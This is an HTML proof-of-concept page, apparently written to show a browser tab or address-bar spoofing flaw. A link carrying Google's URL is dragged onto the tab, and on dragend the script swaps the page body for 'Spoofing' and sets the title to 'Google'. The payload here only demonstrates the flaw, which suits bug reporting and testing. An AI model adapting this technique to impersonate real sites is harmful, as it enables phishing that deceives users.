<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Draggable Link Example</title>
    <script>
        function setData(e) {
            e.dataTransfer.setData("text/plain", "https://www.google.com/");
        }

        document.addEventListener("dragend", function () {
            document.body.innerHTML = '<b>Spoofing</b>';
            document.title = 'Google';
        });
    </script>
</head>
<body>
    <p>Drag the link below to the current TAB:</p>
    <span id="dragMe" draggable="true" ondragstart="setData(event)" style="cursor: grab; color: blue; text-decoration: underline;">
        Drag Me
    </span>
</body>
</html>
